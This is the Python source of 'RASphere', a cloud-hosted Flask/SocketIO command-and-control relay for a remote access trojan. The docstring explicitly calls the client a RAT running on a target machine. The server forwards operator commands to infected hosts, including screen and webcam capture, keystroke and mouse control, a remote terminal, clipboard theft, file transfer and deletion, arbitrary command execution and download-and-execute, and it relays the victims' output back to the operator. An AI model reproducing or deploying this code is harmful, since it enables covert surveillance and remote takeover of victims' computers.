#!/usr/bin/env python3
"""
RASphere - Cloud Relay Server
==============================
Deploy this to a cloud host (Render, Railway, Fly.io).
It serves the web UI and relays commands between the operator's
browser and the RAT client running on the target machine.

Run: python server.py
Default login: admin / rasphere2024 (change in CONFIG below)
"""

import os
import sys
import re
import json
import time
import logging
import threading
from pathlib import Path
from flask import Flask, render_template, request, jsonify, session, send_file
from flask_socketio import SocketIO, emit
from functools import wraps

# ──────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────
CONFIG = {
    "HOST": "0.0.0.0",
    "PORT": int(os.environ.get("PORT", 5000)),
    "USERNAME": os.environ.get("RAS_USERNAME", "Darwin"),
    "PASSWORD": os.environ.get("RAS_PASSWORD", "Darwin"),
    "SECRET_KEY": os.environ.get("RAS_SECRET", os.urandom(24).hex()),
    "CLIENT_SECRET": os.environ.get("RAS_CLIENT_SECRET", "rasphere-client-key-2024"),
    "LOG_LEVEL": os.environ.get("RAS_LOG_LEVEL", "INFO"),
}

# ──────────────────────────────────────────────────────────────────────
# Logging
# ──────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, CONFIG["LOG_LEVEL"]),
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("RASphere-Relay")

# ──────────────────────────────────────────────────────────────────────
# Flask + SocketIO
# ──────────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.config["SECRET_KEY"] = CONFIG["SECRET_KEY"]

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=50 * 1024 * 1024,
)

# ──────────────────────────────────────────────────────────────────────
# State
# ──────────────────────────────────────────────────────────────────────
class RelayState:
    def __init__(self):
        self.lock = threading.RLock()
        self.clients = {}         # client_id -> {"sid": str, "info": dict, "connected_at": float}
        self.operators = {}       # operator_sid -> {"username": str, "controlling": client_id|None}
        self.sid_to_info = {}     # sid -> {"type": "operator"|"client", "id": str}

    def register_client(self, sid, client_id, info):
        with self.lock:
            self.clients[client_id] = {"sid": sid, "info": info, "connected_at": time.time()}
            self.sid_to_info[sid] = {"type": "client", "id": client_id}
            logger.info(f"Client registered: {client_id} ({info.get('hostname', '?')})")

    def unregister_client(self, sid):
        with self.lock:
            info = self.sid_to_info.pop(sid, None)
            if info and info["type"] == "client":
                client_id = info["id"]
                self.clients.pop(client_id, None)
                # Clear operator controlling this client
                for op_sid, op in self.operators.items():
                    if op.get("controlling") == client_id:
                        op["controlling"] = None
                logger.info(f"Client disconnected: {client_id}")
                return client_id
            elif info and info["type"] == "operator":
                self.operators.pop(sid, None)
                logger.info(f"Operator disconnected: {sid}")
        return None

    def register_operator(self, sid, username):
        with self.lock:
            self.operators[sid] = {"username": username, "controlling": None}
            self.sid_to_info[sid] = {"type": "operator", "id": sid}

    def set_operator_target(self, operator_sid, client_id):
        with self.lock:
            if operator_sid in self.operators:
                self.operators[operator_sid]["controlling"] = client_id

    def get_client_sid(self, operator_sid):
        """Given an operator's sid, return the sid of the client they're controlling."""
        with self.lock:
            if operator_sid in self.operators:
                client_id = self.operators[operator_sid].get("controlling")
                if client_id and client_id in self.clients:
                    return self.clients[client_id]["sid"]
        return None

    def get_client_list(self):
        with self.lock:
            return [
                {"id": cid, "hostname": c["info"].get("hostname", "?"),
                 "platform": c["info"].get("platform", "?"),
                 "connected_at": c["connected_at"]}
                for cid, c in self.clients.items()
            ]

    def is_operator(self, sid):
        with self.lock:
            info = self.sid_to_info.get(sid)
            return info and info["type"] == "operator"

    def is_client(self, sid):
        with self.lock:
            info = self.sid_to_info.get(sid)
            return info and info["type"] == "client"


state = RelayState()

# ──────────────────────────────────────────────────────────────────────
# Auth
# ──────────────────────────────────────────────────────────────────────
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("authenticated"):
            return jsonify({"error": "Authentication required"}), 401
        return f(*args, **kwargs)
    return decorated

# ──────────────────────────────────────────────────────────────────────
# HTTP Routes
# ──────────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(silent=True) or {}
    if data.get("username") == CONFIG["USERNAME"] and data.get("password") == CONFIG["PASSWORD"]:
        session["authenticated"] = True
        return jsonify({"success": True})
    return jsonify({"error": "Invalid credentials"}), 401

@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"success": True})

@app.route("/api/clients")
@require_auth
def api_clients():
    return jsonify({"clients": state.get_client_list()})

@app.route("/api/health")
def api_health():
    return jsonify({"status": "ok", "clients": len(state.clients), "operators": len(state.operators)})

# ──────────────────────────────────────────────────────────────────────
# SocketIO Handlers - Operator (Browser) Side
# ──────────────────────────────────────────────────────────────────────
@socketio.on("connect")
def handle_connect():
    logger.info(f"New connection: {request.sid}")

@socketio.on("disconnect")
def handle_disconnect():
    client_id = state.unregister_client(request.sid)
    if client_id:
        # Notify operators that this client disconnected
        socketio.emit("client_left", {"id": client_id})
    else:
        # Operator disconnected - notify clients to stop streaming if no operators left
        pass

@socketio.on("login")
def handle_login(data):
    username = (data or {}).get("username", "").strip()
    password = (data or {}).get("password", "").strip()
    if username == CONFIG["USERNAME"] and password == CONFIG["PASSWORD"]:
        state.register_operator(request.sid, username)
        emit("login_response", {"success": True})
    else:
        emit("login_response", {"success": False, "error": "Invalid credentials"})

@socketio.on("client_register")
def handle_client_register(data):
    """Called by RAT client to register itself."""
    client_secret = (data or {}).get("secret", "")
    if client_secret != CONFIG["CLIENT_SECRET"]:
        emit("auth_required", {"message": "Invalid client secret"})
        disconnect()
        return

    client_id = (data or {}).get("client_id", request.sid)
    client_info = (data or {}).get("info", {})
    state.register_client(request.sid, client_id, client_info)

    emit("registration_ok", {"client_id": client_id})
    # Notify all operators
    socketio.emit("client_joined", {
        "id": client_id,
        "hostname": client_info.get("hostname", "?"),
        "platform": client_info.get("platform", "?")
    })
    logger.info(f"Client authenticated: {client_id}")

@socketio.on("select_client")
def handle_select_client(data):
    """Operator selects which client to control."""
    if not state.is_operator(request.sid):
        return
    client_id = (data or {}).get("client_id")
    state.set_operator_target(request.sid, client_id)
    logger.info(f"Operator {request.sid} now controlling client {client_id}")

# ──────────────────────────────────────────────────────────────────────
# RELAY EVENTS: Operator → Client
# ──────────────────────────────────────────────────────────────────────
# Events that the browser sends and the server forwards to the target client.

RELAY_TO_CLIENT = [
    "start_screen_capture", "stop_screen_capture", "set_screen_quality",
    "start_webcam", "stop_webcam", "set_webcam_quality",
    "mouse_event", "keyboard_event",
    "terminal_start", "terminal_input", "terminal_stop",
    "clipboard_get", "clipboard_set",
    "start_system_monitor", "stop_system_monitor",
    "get_processes", "kill_process",
    "audio_get_volume", "audio_set_volume", "audio_toggle_mute",
    "power_monitor_off", "power_lock", "power_sleep",
    # Fun commands
    "wallpaper_set", "msgbox_show", "open_url", "take_screenshot",
    "get_geoip", "get_apps", "play_sound", "search_files",
    "execute_command", "download_exec",
    "file_list", "file_download_request", "file_upload_chunk",
    "file_delete", "file_new_folder",
    "kill_switch",
]

for event_name in RELAY_TO_CLIENT:
    def make_handler(evt):
        @socketio.on(evt)
        def handler(data=None):
            if not state.is_operator(request.sid):
                return
            target_sid = state.get_client_sid(request.sid)
            if target_sid:
                socketio.emit(evt, data, room=target_sid)
            else:
                emit(f"{evt}_error", {"error": "No client selected or client offline"})
        handler.__name__ = f"handle_{evt}"
        return handler
    make_handler(event_name)

# ──────────────────────────────────────────────────────────────────────
# RELAY EVENTS: Client → Operator
# ──────────────────────────────────────────────────────────────────────
# Events that the client sends and the server forwards to the operator's browser.

RELAY_TO_OPERATOR = [
    "screen_frame", "screen_capture_status",
    "webcam_frame", "webcam_status",
    "system_stats", "monitor_status",
    "terminal_output", "terminal_status",
    "clipboard_data", "clipboard_status",
    "process_list", "process_kill_result",
    "audio_volume", "audio_status",
    "power_result",
    "file_list_result", "file_download_chunk", "file_upload_result",
    "file_delete_result", "file_new_folder_result",
    "cmd_result", "screenshot_result", "geoip_result",
    "apps_result", "search_result", "execute_result",
    "client_error",
]

for event_name in RELAY_TO_OPERATOR:
    def make_handler(evt):
        @socketio.on(evt)
        def handler(data=None):
            if not state.is_client(request.sid):
                return
            # Only emit to operators (not to other clients)
            for op_sid in list(state.operators.keys()):
                socketio.emit(evt, data, room=op_sid)
        handler.__name__ = f"handle_client_{evt}"
        return handler
    make_handler(event_name)

# ──────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────
def print_banner():
    print(r"""
    ╔══════════════════════════════════════════════╗
    ║        RASphere Cloud Relay Server           ║
    ║        Remote Access Command Center          ║
    ╚══════════════════════════════════════════════╝
    """)

def main():
    print_banner()
    logger.info(f"Server starting on {CONFIG['HOST']}:{CONFIG['PORT']}")
    logger.info(f"Web UI: http://{CONFIG['HOST']}:{CONFIG['PORT']}/")
    logger.info(f"Clients connect to the same URL with secret key")
    socketio.run(app, host=CONFIG["HOST"], port=CONFIG["PORT"],
                  debug=False, allow_unsafe_werkzeug=True, use_reloader=False)

if __name__ == "__main__":
    main()
